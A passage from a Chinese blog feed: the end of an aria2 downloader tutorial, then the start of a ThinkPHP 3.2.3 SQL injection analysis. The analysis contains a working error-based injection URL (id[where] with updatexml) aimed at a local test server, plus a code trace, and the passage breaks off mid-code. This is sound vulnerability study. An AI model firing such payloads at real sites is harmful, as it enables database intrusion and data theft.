会利用全部带宽来下载文件，在文件下载完成之前，我们在服务器就什么也做不了（这将会影响其他服务访问带宽）。所以在下载大文件时最好使用 –max-download-limit 选项来避免进一步的问题。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># aria2c --max-download-limit=500k https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2</span><span class="token punctuation">[</span><span class="token comment">#7f9fbf 21MiB/21MiB(99%) CN:1 DL:466KiB]</span>03/22 09:54:51 <span class="token punctuation">[</span>NOTICE<span class="token punctuation">]</span> Download complete: /opt/owncloud-9.0.0.tar.bz2Download Results:gid   <span class="token operator">|</span><span class="token function">stat</span><span class="token operator">|</span>avg speed  <span class="token operator">|</span>path/URI<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>7f9fbf<span class="token operator">|</span>OK  <span class="token operator">|</span>   462KiB/s<span class="token operator">|</span>/opt/owncloud-9.0.0.tar.bz2Status Legend:<span class="token punctuation">(</span>OK<span class="token punctuation">)</span>:download completed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="下载多个文件"><a href="#下载多个文件" class="headerlink" title="下载多个文件"></a>下载多个文件</h3><p>下面的命令将会从指定位置下载超过一个的文件并保存到当前目录，在下载文件的过程中，我们可以看到文件的（日期、时间、下载速度和下载进度）。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># aria2c -Z https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2 ftp://ftp.gnu.org/gnu/wget/wget-1.17.tar.gz</span><span class="token punctuation">[</span>DL:1.7MiB<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token comment">#53533c 272KiB/21MiB(1%)][#b52bb1 768KiB/3.6MiB(20%)]</span>03/22 <span class="token number">10</span>:25:54 <span class="token punctuation">[</span>NOTICE<span class="token punctuation">]</span> Download complete: /opt/wget-1.17.tar.gz<span class="token punctuation">[</span><span class="token comment">#53533c 18MiB/21MiB(86%) CN:1 DL:3.2MiB]</span>03/22 <span class="token number">10</span>:25:59 <span class="token punctuation">[</span>NOTICE<span class="token punctuation">]</span> Download complete: /opt/owncloud-9.0.0.tar.bz2Download Results:gid   <span class="token operator">|</span><span class="token function">stat</span><span class="token operator">|</span>avg speed  <span class="token operator">|</span>path/URI<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>b52bb1<span class="token operator">|</span>OK  <span class="token operator">|</span>   <span class="token number">2</span>.8MiB/s<span class="token operator">|</span>/opt/wget-1.17.tar.gz53533c<span class="token operator">|</span>OK  <span class="token operator">|</span>   <span class="token number">3</span>.4MiB/s<span class="token operator">|</span>/opt/owncloud-9.0.0.tar.bz2Status Legend:<span class="token punctuation">(</span>OK<span class="token punctuation">)</span>:download completed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="续传未完成的下载"><a href="#续传未完成的下载" class="headerlink" title="续传未完成的下载"></a>续传未完成的下载</h3><p>当你遇到一些网络连接问题或者系统问题的时候，并将要下载一个大文件（例如： ISO 镜像文件），我建议你使用 -c 选项，它可以帮助我们从该状态续传未完成的下载，并且像往常一样完成。不然的话，当你再次下载，它将会初始化新的下载，并保存成一个不同的文件名（自动的在文件名后面添加 .1 ）。注意：如果出现了任何中断，aria2 使用 .aria2 后缀保存（未完成的）文件。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># aria2c -c https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2</span><span class="token punctuation">[</span><span class="token comment">#db0b08 8.2MiB/21MiB(38%) CN:1 DL:3.1MiB ETA:4s]^C</span>03/22 <span class="token number">10</span>:09:26 <span class="token punctuation">[</span>NOTICE<span class="token punctuation">]</span> Shutdown sequence commencing<span class="token punctuation">..</span>. Press Ctrl-C again <span class="token keyword">for</span> emergency shutdown.03/22 <span class="token number">10</span>:09:26 <span class="token punctuation">[</span>NOTICE<span class="token punctuation">]</span> Download GID<span class="token comment">#db0b08bf55d5908d not complete: /opt/owncloud-9.0.0.tar.bz2</span>Download Results:gid   <span class="token operator">|</span><span class="token function">stat</span><span class="token operator">|</span>avg speed  <span class="token operator">|</span>path/URI<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>db0b08<span class="token operator">|</span>INPR<span class="token operator">|</span>   <span class="token number">3</span>.3MiB/s<span class="token operator">|</span>/opt/owncloud-9.0.0.tar.bz2Status Legend:<span class="token punctuation">(</span>INPR<span class="token punctuation">)</span>:download in-progress.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果重新启动传输，aria2 将会恢复下载。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># aria2c -c https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2</span><span class="token punctuation">[</span><span class="token comment">#873d08 21MiB/21MiB(98%) CN:1 DL:2.7MiB]</span>03/22 <span class="token number">10</span>:09:57 <span class="token punctuation">[</span>NOTICE<span class="token punctuation">]</span> Download complete: /opt/owncloud-9.0.0.tar.bz2Download Results:gid   <span class="token operator">|</span><span class="token function">stat</span><span class="token operator">|</span>avg speed  <span class="token operator">|</span>path/URI<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>873d08<span class="token operator">|</span>OK  <span class="token operator">|</span>   <span class="token number">1</span>.9MiB/s<span class="token operator">|</span>/opt/owncloud-9.0.0.tar.bz2Status Legend:<span class="token punctuation">(</span>OK<span class="token punctuation">)</span>:download completed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="从文件获取输入"><a href="#从文件获取输入" class="headerlink" title="从文件获取输入"></a>从文件获取输入</h3><p>就像 wget 可以从一个文件获取输入的 URL 列表来下载一样。我们需要创建一个文件，将每一个 URL 存储在单独的行中。ara2 命令行可以添加 -i 选项来执行此操作。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># aria2c -i test-aria2.txt</span><span class="token punctuation">[</span>DL:3.9MiB<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token comment">#b97984 192KiB/21MiB(0%)][#673c8e 2.5MiB/3.6MiB(69%)]</span>03/22 <span class="token number">10</span>:14:22 <span class="token punctuation">[</span>NOTICE<span class="token punctuation">]</span> Download complete: /opt/wget-1.17.tar.gz<span class="token punctuation">[</span><span class="token comment">#b97984 19MiB/21MiB(90%) CN:1 DL:2.5MiB]</span>03/22 <span class="token number">10</span>:14:30 <span class="token punctuation">[</span>NOTICE<span class="token punctuation">]</span> Download complete: /opt/owncloud-9.0.0.tar.bz2Download Results:gid   <span class="token operator">|</span><span class="token function">stat</span><span class="token operator">|</span>avg speed  <span class="token operator">|</span>path/URI<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>673c8e<span class="token operator">|</span>OK  <span class="token operator">|</span>   <span class="token number">4</span>.3MiB/s<span class="token operator">|</span>/opt/wget-1.17.tar.gzb97984<span class="token operator">|</span>OK  <span class="token operator">|</span>   <span class="token number">2</span>.5MiB/s<span class="token operator">|</span>/opt/owncloud-9.0.0.tar.bz2Status Legend:<span class="token punctuation">(</span>OK<span class="token punctuation">)</span>:download completed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="每个主机使用两个连接来下载"><a href="#每个主机使用两个连接来下载" class="headerlink" title="每个主机使用两个连接来下载"></a>每个主机使用两个连接来下载</h3><p>默认情况，每次下载连接到一台服务器的最大数目，对于一条主机只能建立一条。我们可以通过 aria2 命令行添加 -x2（2 表示两个连接）来创建到每台主机的多个连接，以加快下载速度。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># aria2c -x2 https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2</span><span class="token punctuation">[</span><span class="token comment">#ddd4cd 18MiB/21MiB(83%) CN:1 DL:5.0MiB]</span>03/22 <span class="token number">10</span>:16:27 <span class="token punctuation">[</span>NOTICE<span class="token punctuation">]</span> Download complete: /opt/owncloud-9.0.0.tar.bz2Download Results:gid   <span class="token operator">|</span><span class="token function">stat</span><span class="token operator">|</span>avg speed  <span class="token operator">|</span>path/URI<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>ddd4cd<span class="token operator">|</span>OK  <span class="token operator">|</span>   <span class="token number">5</span>.5MiB/s<span class="token operator">|</span>/opt/owncloud-9.0.0.tar.bz2Status Legend:<span class="token punctuation">(</span>OK<span class="token punctuation">)</span>:download completed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="下载-BitTorrent-种子文件"><a href="#下载-BitTorrent-种子文件" class="headerlink" title="下载 BitTorrent 种子文件"></a>下载 BitTorrent 种子文件</h3><p>我们可以使用 aria2 命令行直接下载一个 BitTorrent 种子文件：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># aria2c https://torcache.net/torrent/C86F4E743253E0EBF3090CCFFCC9B56FA38451A3.torrent?title=[kat.cr]irudhi.suttru.2015.official.teaser.full.hd.1080p.pathi.team.sr</span><span class="token punctuation">[</span><span class="token comment">#388321 0B/0B CN:1 DL:0B]                                                                                                                    </span>03/22 <span class="token number">20</span>:06:14 <span class="token punctuation">[</span>NOTICE<span class="token punctuation">]</span> Download complete: /opt/<span class="token punctuation">[</span>kat.cr<span class="token punctuation">]</span>irudhi.suttru.2015.official.teaser.full.hd.1080p.pathi.team.sr.torrent03/22 <span class="token number">20</span>:06:14 <span class="token punctuation">[</span>ERROR<span class="token punctuation">]</span> Exception caughtException: <span class="token punctuation">[</span>BtPostDownloadHandler.cc:98<span class="token punctuation">]</span> <span class="token assign-left variable">errorCode</span><span class="token operator">=</span><span class="token number">25</span> Could not parse BitTorrent metainfoDownload Results:gid   <span class="token operator">|</span><span class="token function">stat</span><span class="token operator">|</span>avg speed  <span class="token operator">|</span>path/URI<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token number">388321</span><span class="token operator">|</span>OK  <span class="token operator">|</span>    11MiB/s<span class="token operator">|</span>/opt/<span class="token punctuation">[</span>kat.cr<span class="token punctuation">]</span>irudhi.suttru.2015.official.teaser.full.hd.1080p.pathi.team.sr.torrentStatus Legend:<span class="token punctuation">(</span>OK<span class="token punctuation">)</span>:download completed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="下载-BitTorrent-磁力链接"><a href="#下载-BitTorrent-磁力链接" class="headerlink" title="下载 BitTorrent 磁力链接"></a>下载 BitTorrent 磁力链接</h3><p>使用 aria2 我们也可以通过 BitTorrent 磁力链接直接下载一个种子文件：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># aria2c 'magnet:?xt=urn:btih:248D0A1CD08284299DE78D5C1ED359BB46717D8C'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="下载-BitTorrent-Metalink-种子"><a href="#下载-BitTorrent-Metalink-种子" class="headerlink" title="下载 BitTorrent Metalink 种子"></a>下载 BitTorrent Metalink 种子</h3><p>我们也可以通过 aria2 命令行直接下载一个 Metalink 文件。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># aria2c https://curl.haxx.se/metalink.cgi?curl=tar.bz2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="从密码保护的网站下载一个文件"><a href="#从密码保护的网站下载一个文件" class="headerlink" title="从密码保护的网站下载一个文件"></a>从密码保护的网站下载一个文件</h3><p>或者，我们也可以从一个密码保护网站下载一个文件。下面的命令行将会从一个密码保护网站中下载文件。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># aria2c --http-user=xxx --http-password=xxx https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2</span><span class="token comment"># aria2c --ftp-user=xxx --ftp-password=xxx ftp://ftp.gnu.org/gnu/wget/wget-1.17.tar.gz</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="aria2-浏览器版"><a href="#aria2-浏览器版" class="headerlink" title="aria2 浏览器版"></a>aria2 浏览器版</h2><p>有些同学不习惯使用命令行，别着急，aria2同样有gui版本。</p><blockquote><p>注意使用gui版的前提是已经安装完毕aria2,并且开启了rpc，这些都可以在配置文件中进行指定。</p></blockquote><p>1.在线版：<a href="https://ziahamza.github.io/webui-aria2/">https://ziahamza.github.io/webui-aria2/</a></p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200729155905.png" alt="20200729155905"></p><p>初次使用时需要进行连接配置：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200729160503.png" alt="20200729160503"></p><p>配置完毕后即可通过rpc和本地aria2通信，然后就可以添加下载任务进行下载了。</p><p>2.chrome插件：<a href="https://chrome.google.com/webstore/detail/aria2-for-chrome/mpkodccbngfoacfalldjimigbofkhgjn/related?hl=zh-CN">Aria2 for Chrome</a></p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200729161213.png" alt="20200729161213"></p><p>同样使用rpc连接到本地aria2后即可使用。</p><p>类似的软件还有很多就不一一推荐了。</p><h2 id="aria2-桌面版"><a href="#aria2-桌面版" class="headerlink" title="aria2 桌面版"></a>aria2 桌面版</h2><p>除了使用命令行和浏览器，还可以使用aria2的桌面版，本文推荐作者正在使用的两个。</p><p>1.Aria2D</p><p>项目地址：<a href="https://github.com/xjbeta/Aria2D">https://github.com/xjbeta/Aria2D</a></p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200729161733.png" alt="20200729161733"></p><p>2.Motrix</p><p>项目地址：<a href="https://motrix.app/">https://motrix.app/</a></p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200729162647.png" alt="20200729162647"></p><p>推荐使用这款软件，内置了aria2，无需进行配置即可使用。</p><h2 id="为百度云盘加速"><a href="#为百度云盘加速" class="headerlink" title="为百度云盘加速"></a>为百度云盘加速</h2><p>最后推荐一个插件，本插件可将百度云盘文件下载地址转换为aria2的下载地址，然后就可以告别百度云盘的龟速下载了：</p><p>插件地址：<a href="https://github.com/syhyz1990/baiduyun">百度网盘直链下载助手</a></p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200729162336.png" alt="20200729162336"></p><p>实测下载速度可以达到500kb/s，虽然不是很快，但也比之前强了不少。</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.zcfy.cc/article/aria2-command-line-downloader-command-examples">https://www.zcfy.cc/article/aria2-command-line-downloader-command-examples</a><br><a href="https://aria2.github.io/manual/en/html/aria2c.html#">https://aria2.github.io/manual/en/html/aria2c.html#</a><br><a href="https://gist.github.com/maboloshi/a4b1f27567319d4a42352aadd036a578">https://gist.github.com/maboloshi/a4b1f27567319d4a42352aadd036a578</a><br><a href="https://sshwy.gitee.io/2019/04/13/53687/">https://sshwy.gitee.io/2019/04/13/53687/</a><br><a href="http://ivo-wang.github.io/2019/04/18/%E5%85%B3%E4%BA%8Earia2%E6%9C%80%E5%AE%8C%E6%95%B4%E7%9A%84%E4%B8%80%E7%AF%87/">http://ivo-wang.github.io/2019/04/18/%E5%85%B3%E4%BA%8Earia2%E6%9C%80%E5%AE%8C%E6%95%B4%E7%9A%84%E4%B8%80%E7%AF%87/</a><br><a href="https://github.com/P3TERX/aria2.conf">https://github.com/P3TERX/aria2.conf</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> aria2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp3.2.3 sql注入分析</title>
      <link href="2020/06/07/thinkphp3.2.3-sqli/"/>
      <url>2020/06/07/thinkphp3.2.3-sqli/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2018年8月23号11:25分 星期四，tp团队对于已经停止更新的thinkphp3系列进行了一处安全更新，经过分析，此次更新修正了由于<code>select()</code>,<code>find()</code>,<code>delete()</code>方法可能会传入数组类型数据产生的多个sql注入隐患。</p><p>thinkphp3的github地址为：<a href="https://github.com/top-think/thinkphp">https://github.com/top-think/thinkphp</a></p><p>下载完毕后需要使用<code>git checkout</code>命令回退到上一次的提交:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout 109bf30<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看本次更新的<a href="https://github.com/top-think/thinkphp/commit/9e1db19c1e455450cfebb8b573bb51ab7a1cef04#diff-c7e3ac519b1260c65bca310cad99050c">提交记录</a>：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607132038.png" alt="20200607132038"></p><p>可看到此次更新主要是在<code>ThinkPHP/Library/Think/Model.class.php</code>文件中，其中对于<code>delete</code>，<code>find</code>，<code>select</code>三个函数进行了修改。思考可能是因为<code>$option</code>参数可控，然后经过<code>_parseOptions</code>函数处理过后产生了注入。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>将下载的tp3框架放入web服务器的根目录下，然后在<code>/Application/Home/Controller/IndexController.class.php</code>中写一段测试代码：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607163720.png" alt="20200607163720"></p><p>新建<code>test</code>函数用来测试tp3的<code>find</code>方法，在本地的mysql数据库中新建tptest数据库，然后新建user表，并添加测试数据：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607164204.png" alt="20200607164204"></p><p>访问<code>http://127.0.0.1:8888/index.php?m=Home&amp;c=Index&amp;a=test&amp;id=1</code>查看结果：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607164514.png" alt="20200607164514"></p><p>看到以上结果证明环境搭建成功。</p><h2 id="注入分析"><a href="#注入分析" class="headerlink" title="注入分析"></a>注入分析</h2><p>根据网上给的poc看下结果，poc为：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">http://127.0.0.1:8888/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1 and updatexml(1,concat(0x7e,database(),0x7e),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功执行sql语句：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607164941.png" alt="20200607164941"></p><p>使用xdeug看下调用过程：</p><p>在此处打断点：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607165202.png" alt="20200607165202"></p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607165252.png" alt="20200607165252"></p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607165350.png" alt="20200607165350"></p><p>进入<code>M</code>方法：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607165511.png" alt="20200607165511"></p><p>进入<code>find</code>方法：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607165638.png" alt="20200607165638"></p><p>看下面这个判断：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">is_string</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$where</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getPk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$options</span><span class="token punctuation">;</span>    <span class="token variable">$options</span>               <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span>      <span class="token operator">=</span> <span class="token variable">$where</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于现在的<code>$option</code>是个数组，所以并不会进入这个判断，继续往下：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607165942.png" alt="20200607165942"></p><p><code>getPk</code>函数是查找mysql主键的函数，继续往下会有一个判断：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$pk</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 根据复合主键查询</span>            <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">array_keys</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_int</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$count</span><span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$pk</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token variable">$count</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$pk</span> <span class="token keyword">as</span> <span class="token variable">$field</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$where</span><span class="token punctuation">[</span><span class="token variable">$field</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$where</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span aria-hidden="true" 